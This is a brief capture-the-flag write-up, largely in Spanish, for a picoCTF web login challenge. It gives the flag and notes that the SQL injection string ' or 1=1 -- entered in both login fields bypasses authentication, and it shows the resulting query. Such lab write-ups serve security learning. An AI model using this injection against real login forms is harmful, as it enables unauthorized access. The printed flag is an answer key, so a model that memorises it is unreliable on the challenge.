## **Descripcion**
Can you login to this website? Try to login [here](http://saturn.picoctf.net:62279/).
## **Solucion**
picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}

## **Notas adicionales**
Aqui se ingreso a la pagina y se puso como clave y contraseña  username: ' or 1=1 --
password: ' or 1=1 --
SQL query: SELECT * FROM users WHERE name='' or 1=1 --' AND password='' or 1=1 --'

nos da este mensaje  Logged in! But can you see the flag, it is in plainsight.
lo que hice fue ver el codigo fuente de la pagina y ahi se obtuvo la bandera.
